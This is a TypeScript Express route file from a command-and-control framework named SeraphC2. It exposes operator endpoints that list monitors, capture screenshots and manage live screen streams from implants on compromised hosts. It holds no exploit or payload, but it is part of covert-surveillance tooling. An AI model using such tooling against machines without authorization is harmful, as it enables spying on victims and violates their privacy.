/**
 * Screen monitoring routes for SeraphC2
 * Implements requirements 9.1, 9.2, 9.3 from the SeraphC2 specification
 */

import { Router, Request, Response } from 'express';
import { ScreenService } from '../../core/services/screen.service';
import { AuthMiddleware } from '../../core/auth/auth.middleware';
import { Logger } from '../../utils/logger';
import { ScreenStreamConfig, ScreenshotRequest } from '../../types/entities';

// Simple validation helper
const validateUUID = (id: string): boolean => {
  const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  return uuidRegex.test(id);
};

export interface ScreenRoutesConfig {
  screenService: ScreenService;
  authMiddleware: AuthMiddleware;
}

export function createScreenRoutes(config: ScreenRoutesConfig): Router {
  const router = Router();
  const { screenService, authMiddleware } = config;
  const logger = Logger.getInstance();

  // Get available monitors for an implant
  router.get(
    '/implants/:implantId/monitors',
    authMiddleware.requirePermissions(['screen:read']),
    async (req: Request, res: Response) => {
      try {
        const implantId = req.params['implantId'] as string;

        if (!validateUUID(implantId)) {
          return res.status(400).json({
            success: false,
            message: 'Invalid implant ID',
          });
        }

        const operatorId = req.operator?.id;

        if (!operatorId) {
          return res.status(401).json({
            success: false,
            message: 'Operator ID not found in request',
          });
        }

        const result = await screenService.getMonitors(implantId, operatorId);

        logger.info('Monitor list retrieved', {
          implantId,
          operatorId,
          monitorCount: result.totalCount,
        });

        return res.json({
          success: true,
          data: result,
        });
      } catch (error) {
        logger.error(
          'Error occurred',
          error instanceof Error ? error : new Error('Unknown error'),
          {}
        );

        return res.status(500).json({
          success: false,
          message: 'Failed to get monitor list',
          errorMessage: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  // Take a screenshot
  router.post(
    '/implants/:implantId/screenshot',
    authMiddleware.requirePermissions(['screen:capture']),
    async (req: Request, res: Response) => {
      try {
        const implantId = req.params['implantId'] as string;

        if (!validateUUID(implantId)) {
          return res.status(400).json({
            success: false,
            message: 'Invalid implant ID',
          });
        }

        const operatorId = req.operator?.id;

        if (!operatorId) {
          return res.status(401).json({
            success: false,
            message: 'Operator ID not found in request',
          });
        }

        const screenshotRequest: ScreenshotRequest = {
          implantId,
          monitorId: req.body.monitorId,
          quality: req.body.quality,
          width: req.body.width,
          height: req.body.height,
          captureMouseCursor: req.body.captureMouseCursor,
        };

        const result = await screenService.takeScreenshot(implantId, operatorId, screenshotRequest);

        logger.info('Screenshot taken', {
          implantId,
          operatorId,
          monitorId: result.monitorId,
          size: result.size,
        });

        return res.json({
          success: true,
          data: result,
        });
      } catch (error) {
        logger.error(
          'Error occurred',
          error instanceof Error ? error : new Error('Unknown error'),
          {}
        );

        return res.status(500).json({
          success: false,
          message: 'Failed to take screenshot',
          errorMessage: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  // Start screen streaming
  router.post(
    '/implants/:implantId/stream/start',
    authMiddleware.requirePermissions(['screen:stream']),
    async (req: Request, res: Response) => {
      try {
        const implantId = req.params['implantId'] as string;

        if (!validateUUID(implantId)) {
          return res.status(400).json({
            success: false,
            message: 'Invalid implant ID',
          });
        }

        const operatorId = req.operator?.id;

        if (!operatorId) {
          return res.status(401).json({
            success: false,
            message: 'Operator ID not found in request',
          });
        }

        const config: ScreenStreamConfig = {
          monitorId: req.body.monitorId,
          quality: req.body.quality,
          frameRate: req.body.frameRate,
          width: req.body.width,
          height: req.body.height,
          captureMouseCursor: req.body.captureMouseCursor !== false,
        };

        const result = await screenService.startScreenStream(implantId, operatorId, config);

        logger.info('Screen stream start requested', {
          implantId,
          operatorId,
          config,
          success: result.success,
        });

        return res.json({
          success: result.success,
          message: result.message,
          data: {
            streamId: result.streamId,
            config: result.config,
          },
        });
      } catch (error) {
        logger.error(
          'Error occurred',
          error instanceof Error ? error : new Error('Unknown error'),
          {}
        );

        return res.status(500).json({
          success: false,
          message: 'Failed to start screen stream',
          errorMessage: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  // Stop screen streaming
  router.post(
    '/implants/:implantId/stream/stop',
    authMiddleware.requirePermissions(['screen:stream']),
    async (req: Request, res: Response) => {
      try {
        const implantId = req.params['implantId'] as string;

        if (!validateUUID(implantId)) {
          return res.status(400).json({
            success: false,
            message: 'Invalid implant ID',
          });
        }

        const operatorId = req.operator?.id;

        if (!operatorId) {
          return res.status(401).json({
            success: false,
            message: 'Operator ID not found in request',
          });
        }

        const result = await screenService.stopScreenStream(implantId, operatorId);

        logger.info('Screen stream stop requested', {
          implantId,
          operatorId,
          success: result.success,
          frameCount: result.frameCount,
          totalDataSent: result.totalDataSent,
        });

        return res.json({
          success: result.success,
          message: result.message,
          data: {
            streamId: result.streamId,
            frameCount: result.frameCount,
            totalDataSent: result.totalDataSent,
          },
        });
      } catch (error) {
        logger.error(
          'Error occurred',
          error instanceof Error ? error : new Error('Unknown error'),
          {}
        );

        return res.status(500).json({
          success: false,
          message: 'Failed to stop screen stream',
          errorMessage: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  // Update stream configuration
  router.put(
    '/implants/:implantId/stream/config',
    authMiddleware.requirePermissions(['screen:stream']),
    async (req: Request, res: Response) => {
      try {
        const implantId = req.params['implantId'] as string;

        if (!validateUUID(implantId)) {
          return res.status(400).json({
            success: false,
            message: 'Invalid implant ID',
          });
        }

        const operatorId = req.operator?.id;

        if (!operatorId) {
          return res.status(401).json({
            success: false,
            message: 'Operator ID not found in request',
          });
        }

        const config: Partial<ScreenStreamConfig> = {};
        if (req.body.monitorId !== undefined) config.monitorId = req.body.monitorId;
        if (req.body.quality !== undefined) config.quality = req.body.quality;
        if (req.body.frameRate !== undefined) config.frameRate = req.body.frameRate;
        if (req.body.width !== undefined) config.width = req.body.width;
        if (req.body.height !== undefined) config.height = req.body.height;
        if (req.body.captureMouseCursor !== undefined)
          config.captureMouseCursor = req.body.captureMouseCursor;

        const result = await screenService.updateStreamConfig(implantId, operatorId, config);

        logger.info('Screen stream config update requested', {
          implantId,
          operatorId,
          config,
          success: result.success,
        });

        return res.json({
          success: result.success,
          message: result.message,
        });
      } catch (error) {
        logger.error(
          'Error occurred',
          error instanceof Error ? error : new Error('Unknown error'),
          {}
        );

        return res.status(500).json({
          success: false,
          message: 'Failed to update stream config',
          errorMessage: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  // Get stream status
  router.get(
    '/implants/:implantId/stream/status',
    authMiddleware.requirePermissions(['screen:read']),
    async (req: Request, res: Response) => {
      try {
        const implantId = req.params['implantId'] as string;

        if (!validateUUID(implantId)) {
          return res.status(400).json({
            success: false,
            message: 'Invalid implant ID',
          });
        }

        const status = screenService.getStreamStatus(implantId);

        return res.json({
          success: true,
          data: status,
        });
      } catch (error) {
        logger.error(
          'Error occurred',
          error instanceof Error ? error : new Error('Unknown error'),
          {}
        );

        return res.status(500).json({
          success: false,
          message: 'Failed to get stream status',
          errorMessage: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  // Get all active streams
  router.get(
    '/streams/active',
    authMiddleware.requirePermissions(['screen:read']),
    async (req: Request, res: Response) => {
      try {
        const activeStreams = screenService.getAllActiveStreams();
        const streamsArray = Array.from(activeStreams.entries()).map(([id, status]) => ({
          streamId: id,
          implantId: id.substring(0, id.lastIndexOf('-')),
          ...status,
        }));

        return res.json({
          success: true,
          data: {
            streams: streamsArray,
            totalCount: streamsArray.length,
          },
        });
      } catch (error) {
        logger.error(
          'Error occurred',
          error instanceof Error ? error : new Error('Unknown error'),
          {}
        );

        return res.status(500).json({
          success: false,
          message: 'Failed to get active streams',
          errorMessage: error instanceof Error ? error.message : 'Unknown error',
        });
      }
    }
  );

  return router;
}
